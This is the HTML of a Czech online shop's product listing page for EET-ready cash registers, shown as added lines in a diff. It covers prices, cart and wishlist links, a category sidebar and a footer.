+                                                    <li><a href="http://www.pokladny-kopirky.cz/wishlist/index/add/product/34/form_key/YtnJGeEdy4JLey2V/" class="link-wishlist">Přidat do seznamu přání</a></li>
+                                                                            <li><span class="separator">|</span> <a href="http://www.pokladny-kopirky.cz/catalog/product_compare/add/product/34/uenc/aHR0cDovL3d3dy5wb2tsYWRueS1rb3Bpcmt5LmN6Lw,,/form_key/YtnJGeEdy4JLey2V/" class="link-compare">Přidat do srovnání</a></li>
+                                            </ul>
+                </div>
+            </li>
+                                    <li class="item">
+                <a href="http://www.pokladny-kopirky.cz/hlavni-strana/serd-360t-restauracni-63.html" title="Reg.pokladny SC 550TF - vhodná pro bary,prodejny rychlého občerstvení,cukrárny,květinářství,perárny aj." class="product-image"><img src="http://www.pokladny-kopirky.cz/media/catalog/product/cache/1/small_image/135x/9df78eab33525d08d6e5fb8d27136e95/5/5/550tf-mala-bw_1__1.jpg" width="135" height="135" alt="Reg.pokladny SC 550TF - vhodná pro bary,prodejny rychlého občerstvení,cukrárny,květinářství,perárny aj." /></a>
+                <h2 class="product-name"><a href="http://www.pokladny-kopirky.cz/hlavni-strana/serd-360t-restauracni-63.html" title="Reg. pokladna  pro EET: SC 550TF Color - malá pokladní zásuvka">Reg. pokladna  pro EET: SC 550TF Color - malá pokladní zásuvka</a></h2>
+                                
+
+                        
+    <div class="price-box">
+                                            
+                    <p class="old-price">
+                <span class="price-label">Běžná cena(s DPH):</span>
+                <span class="price" id="old-price-33">
+                    15 610,00 Kč                </span>
+            </p>
+
+                            <p class="special-price">
+                    <span class="price-label">Akční cena</span>
+                <span class="price" id="product-price-33">
+                    15 427,00 Kč                </span>
+                </p>
+                    
+    
+        </div>
+
+                <div class="actions">
+                                            <button type="button" title="Přidat do košíku" class="button btn-cart" onclick="setLocation('http://www.pokladny-kopirky.cz/checkout/cart/add/uenc/aHR0cDovL3d3dy5wb2tsYWRueS1rb3Bpcmt5LmN6Lw,,/product/33/form_key/YtnJGeEdy4JLey2V/')"><span><span>Přidat do košíku</span></span></button>
+                                        <ul class="add-to-links">
+                                                    <li><a href="http://www.pokladny-kopirky.cz/wishlist/index/add/product/33/form_key/YtnJGeEdy4JLey2V/" class="link-wishlist">Přidat do seznamu přání</a></li>
+                                                                            <li><span class="separator">|</span> <a href="http://www.pokladny-kopirky.cz/catalog/product_compare/add/product/33/uenc/aHR0cDovL3d3dy5wb2tsYWRueS1rb3Bpcmt5LmN6Lw,,/form_key/YtnJGeEdy4JLey2V/" class="link-compare">Přidat do srovnání</a></li>
+                                            </ul>
+                </div>
+            </li>
+                                    <li class="item last">
+                <a href="http://www.pokladny-kopirky.cz/hlavni-strana/serd-360t-15.html" title="SC 550TF- Pokladna střední třídy pro bufety,rychlé občerstvení,cukrárny,prodejny květin aj." class="product-image"><img src="http://www.pokladny-kopirky.cz/media/catalog/product/cache/1/small_image/135x/9df78eab33525d08d6e5fb8d27136e95/b/i/big_550tf_velka_big_i-150x121_1_.jpg" width="135" height="135" alt="SC 550TF- Pokladna střední třídy pro bufety,rychlé občerstvení,cukrárny,prodejny květin aj." /></a>
+                <h2 class="product-name"><a href="http://www.pokladny-kopirky.cz/hlavni-strana/serd-360t-15.html" title="Reg. pokladna pro EET:  SC ECR 550TF">Reg. pokladna pro EET:  SC ECR 550TF</a></h2>
+                                
+
+                        
+    <div class="price-box">
+                                            
+                    <p class="old-price">
+                <span class="price-label">Běžná cena(s DPH):</span>
+                <span class="price" id="old-price-9">
+                    17 800,00 Kč                </span>
+            </p>
+
+                            <p class="special-price">
+                    <span class="price-label">Akční cena</span>
+                <span class="price" id="product-price-9">
+                    17 486,00 Kč                </span>
+                </p>
+                    
+    
+        </div>
+
+                <div class="actions">
+                                            <button type="button" title="Přidat do košíku" class="button btn-cart" onclick="setLocation('http://www.pokladny-kopirky.cz/checkout/cart/add/uenc/aHR0cDovL3d3dy5wb2tsYWRueS1rb3Bpcmt5LmN6Lw,,/product/9/form_key/YtnJGeEdy4JLey2V/')"><span><span>Přidat do košíku</span></span></button>
+                                        <ul class="add-to-links">
+                                                    <li><a href="http://www.pokladny-kopirky.cz/wishlist/index/add/product/9/form_key/YtnJGeEdy4JLey2V/" class="link-wishlist">Přidat do seznamu přání</a></li>
+                                                                            <li><span class="separator">|</span> <a href="http://www.pokladny-kopirky.cz/catalog/product_compare/add/product/9/uenc/aHR0cDovL3d3dy5wb2tsYWRueS1rb3Bpcmt5LmN6Lw,,/form_key/YtnJGeEdy4JLey2V/" class="link-compare">Přidat do srovnání</a></li>
+                                            </ul>
+                </div>
+            </li>
+                </ul>
+                                <ul class="products-grid">
+                    <li class="item first">
+                <a href="http://www.pokladny-kopirky.cz/hlavni-strana/serd-465t-63.html" title="Reg.pokladna SERD ECR 550TF color,veká pokladní zásuvka" class="product-image"><img src="http://www.pokladny-kopirky.cz/media/catalog/product/cache/1/small_image/135x/9df78eab33525d08d6e5fb8d27136e95/b/i/big_550tf_velka_big_i-150x121_1__1.jpg" width="135" height="135" alt="Reg.pokladna SERD ECR 550TF color,veká pokladní zásuvka" /></a>
+                <h2 class="product-name"><a href="http://www.pokladny-kopirky.cz/hlavni-strana/serd-465t-63.html" title="Reg. pokladna  pro EET: SERD ECR 550TF -  color s vekou pokladní zásuvkou">Reg. pokladna  pro EET: SERD ECR 550TF -  color s vekou pokladní zásuvkou</a></h2>
+                                
+
+                        
+    <div class="price-box">
+                                            
+                    <p class="old-price">
+                <span class="price-label">Běžná cena(s DPH):</span>
+                <span class="price" id="old-price-20">
+                    18 600,00 Kč                </span>
+            </p>
+
+                            <p class="special-price">
+                    <span class="price-label">Akční cena</span>
+                <span class="price" id="product-price-20">
+                    18 392,00 Kč                </span>
+                </p>
+                    
+    
+        </div>
+
+                <div class="actions">
+                                            <button type="button" title="Přidat do košíku" class="button btn-cart" onclick="setLocation('http://www.pokladny-kopirky.cz/checkout/cart/add/uenc/aHR0cDovL3d3dy5wb2tsYWRueS1rb3Bpcmt5LmN6Lw,,/product/20/form_key/YtnJGeEdy4JLey2V/')"><span><span>Přidat do košíku</span></span></button>
+                                        <ul class="add-to-links">
+                                                    <li><a href="http://www.pokladny-kopirky.cz/wishlist/index/add/product/20/form_key/YtnJGeEdy4JLey2V/" class="link-wishlist">Přidat do seznamu přání</a></li>
+                                                                            <li><span class="separator">|</span> <a href="http://www.pokladny-kopirky.cz/catalog/product_compare/add/product/20/uenc/aHR0cDovL3d3dy5wb2tsYWRueS1rb3Bpcmt5LmN6Lw,,/form_key/YtnJGeEdy4JLey2V/" class="link-compare">Přidat do srovnání</a></li>
+                                            </ul>
+                </div>
+            </li>
+                                    <li class="item">
+                <a href="http://www.pokladny-kopirky.cz/hlavni-strana/serd-360t-restauracni-65.html" title="SC 550TF - restaurační" class="product-image"><img src="http://www.pokladny-kopirky.cz/media/catalog/product/cache/1/small_image/135x/9df78eab33525d08d6e5fb8d27136e95/s/e/serd-ecr_550tf_rest_1_.jpg" width="135" height="135" alt="SC 550TF - restaurační" /></a>
+                <h2 class="product-name"><a href="http://www.pokladny-kopirky.cz/hlavni-strana/serd-360t-restauracni-65.html" title="Reg.pokladna pro EET : SC ECR 550TF - restaurační ">Reg.pokladna pro EET : SC ECR 550TF - restaurační </a></h2>
+                                
+
+                        
+    <div class="price-box">
+                                            
+                    <p class="old-price">
+                <span class="price-label">Běžná cena(s DPH):</span>
+                <span class="price" id="old-price-57">
+                    16 819,00 Kč                </span>
+            </p>
+
+                            <p class="special-price">
+                    <span class="price-label">Akční cena</span>
+                <span class="price" id="product-price-57">
+                    16 698,00 Kč                </span>
+                </p>
+                    
+    
+        </div>
+
+                <div class="actions">
+                                            <button type="button" title="Přidat do košíku" class="button btn-cart" onclick="setLocation('http://www.pokladny-kopirky.cz/checkout/cart/add/uenc/aHR0cDovL3d3dy5wb2tsYWRueS1rb3Bpcmt5LmN6Lw,,/product/57/form_key/YtnJGeEdy4JLey2V/')"><span><span>Přidat do košíku</span></span></button>
+                                        <ul class="add-to-links">
+                                                    <li><a href="http://www.pokladny-kopirky.cz/wishlist/index/add/product/57/form_key/YtnJGeEdy4JLey2V/" class="link-wishlist">Přidat do seznamu přání</a></li>
+                                                                            <li><span class="separator">|</span> <a href="http://www.pokladny-kopirky.cz/catalog/product_compare/add/product/57/uenc/aHR0cDovL3d3dy5wb2tsYWRueS1rb3Bpcmt5LmN6Lw,,/form_key/YtnJGeEdy4JLey2V/" class="link-compare">Přidat do srovnání</a></li>
+                                            </ul>
+                </div>
+            </li>
+                                    <li class="item last">
+                <a href="http://www.pokladny-kopirky.cz/hlavni-strana/serd-550tf-color-restauracni.html" title="SC 550TF Color - restaurační,pro restaurace,cukrárny,občerstvení" class="product-image"><img src="http://www.pokladny-kopirky.cz/media/catalog/product/cache/1/small_image/135x/9df78eab33525d08d6e5fb8d27136e95/s/e/serd-ecr_550tf_rest_1__3.jpg" width="135" height="135" alt="SC 550TF Color - restaurační,pro restaurace,cukrárny,občerstvení" /></a>
+                <h2 class="product-name"><a href="http://www.pokladny-kopirky.cz/hlavni-strana/serd-550tf-color-restauracni.html" title="Reg.pokladna pro EET : SC ECR 550TF color - restaurační ">Reg.pokladna pro EET : SC ECR 550TF color - restaurační </a></h2>
+                                
+
+                        
+    <div class="price-box">
+                                            
+                    <p class="old-price">
+                <span class="price-label">Běžná cena(s DPH):</span>
+                <span class="price" id="old-price-31">
+                    17 800,00 Kč                </span>
+            </p>
+
+                            <p class="special-price">
+                    <span class="price-label">Akční cena</span>
+                <span class="price" id="product-price-31">
+                    17 545,00 Kč                </span>
+                </p>
+                    
+    
+        </div>
+
+                <div class="actions">
+                                            <button type="button" title="Přidat do košíku" class="button btn-cart" onclick="setLocation('http://www.pokladny-kopirky.cz/checkout/cart/add/uenc/aHR0cDovL3d3dy5wb2tsYWRueS1rb3Bpcmt5LmN6Lw,,/product/31/form_key/YtnJGeEdy4JLey2V/')"><span><span>Přidat do košíku</span></span></button>
+                                        <ul class="add-to-links">
+                                                    <li><a href="http://www.pokladny-kopirky.cz/wishlist/index/add/product/31/form_key/YtnJGeEdy4JLey2V/" class="link-wishlist">Přidat do seznamu přání</a></li>
+                                                                            <li><span class="separator">|</span> <a href="http://www.pokladny-kopirky.cz/catalog/product_compare/add/product/31/uenc/aHR0cDovL3d3dy5wb2tsYWRueS1rb3Bpcmt5LmN6Lw,,/form_key/YtnJGeEdy4JLey2V/" class="link-compare">Přidat do srovnání</a></li>
+                                            </ul>
+                </div>
+            </li>
+                </ul>
+                        <script type="text/javascript">decorateGeneric($$('ul.products-grid'), ['odd','even','first','last'])</script>
+    
+    <div class="toolbar-bottom">
+            </div>
+</div>
+</p></div>                    </div>
+                    <div class="col-left sidebar"><div class="block block-viewed">
+    <div class="block-title">
+        <strong><span>Kategorie:</span></strong> </div>
+        <div class="block-content">
+        <ul id="vertnav"> 
+  <li class="first level0-inactive level0 inactive pokladny">
+    <span class="vertnav-cat"><a href="http://www.pokladny-kopirky.cz/pokladny-obchodni.html"><span>Pokladny </span></a></span>
+
+  </li>
+  <li class="level0-inactive level0 inactive program-vybaven">
+    <span class="vertnav-cat"><a href="http://www.pokladny-kopirky.cz/program-vybaveni-pokladen.html"><span>Program.vybavení </span></a></span>
+
+  </li>
+  <li class="level0-inactive level0 inactive restaura-n-a-obchodn-pos-syst-my">
+    <span class="vertnav-cat"><a href="http://www.pokladny-kopirky.cz/pos.html"><span>Restaurační a obchodní POS systémy</span></a></span>
+
+  </li>
+  <li class="level0-inactive level0 inactive tisk-rny">
+    <span class="vertnav-cat"><a href="http://www.pokladny-kopirky.cz/tiskarny.html"><span>Tiskárny</span></a></span>
+
+  </li>
+  <li class="level0-inactive level0 inactive v-hy">
+    <span class="vertnav-cat"><a href="http://www.pokladny-kopirky.cz/vahy.html"><span>Váhy</span></a></span>
+
+  </li>
+  <li class="level0-inactive level0 inactive spot-ebn-materi-l">
+    <span class="vertnav-cat"><a href="http://www.pokladny-kopirky.cz/spot.html"><span>Spotřební materiál</span></a></span>
+
+  </li>
+  <li class="level0-inactive level0 inactive repasovan">
+    <span class="vertnav-cat"><a href="http://www.pokladny-kopirky.cz/repasovane.html"><span>Repasované</span></a></span>
+
+  </li>
+  <li class="last level0-inactive level0 inactive servisn-pr-ce">
+    <span class="vertnav-cat"><a href="http://www.pokladny-kopirky.cz/servisni-prace.html"><span>Servisní práce</span></a></span>
+
+  </li>
+        </ul>
+    </div>
+</div></div>
+                </div>
+                <div class="col-right sidebar"><div class="block block-cart">
+        <div class="block-title">
+        <strong><span>Můj košík</span></strong>
+    </div>
+    <div class="block-content">
+                        <p class="empty">V košíku nejsou žádné položky.</p>
+        </div>
+</div>
+</div>
+            </div>
+        </div>
+        ﻿<div class="footer-container">
+	<div class="footer">
+		<div class="footerl">
+			<p class="legality">
+			&copy; 2011   
+			Vytvořilo studio <a href="www.webdevel.cz" title="Webdevel, tvorba internetových obchodů a www stránek">Webdevel s.r.o.</a>
+			</p>
+			 
+			</div>
+		<div class="informational">
+		    <ul class="links">
+                        <li class="first" ><a href="http://www.pokladny-kopirky.cz/catalog/seo_sitemap/category/" title="Mapa stránek" >Mapa stránek</a></li>
+                                <li ><a href="http://www.pokladny-kopirky.cz/catalogsearch/term/popular/" title="Hledané výrazy" >Hledané výrazy</a></li>
+                                <li ><a href="http://www.pokladny-kopirky.cz/catalogsearch/advanced/" title="Pokročilé vyhledávání" >Pokročilé vyhledávání</a></li>
+                                <li ><a href="http://www.pokladny-kopirky.cz/sales/guest/form/" title="Orders and Returns" >Orders and Returns</a></li>
+                                <li class=" last" ><a href="http://www.pokladny-kopirky.cz/contacts/" title="Kontaktujte nás" >Kontaktujte nás</a></li>
+            </ul>
+		    		</div>
+	</div>
+</div>            </div>
+</div>
+</body>
+</html>
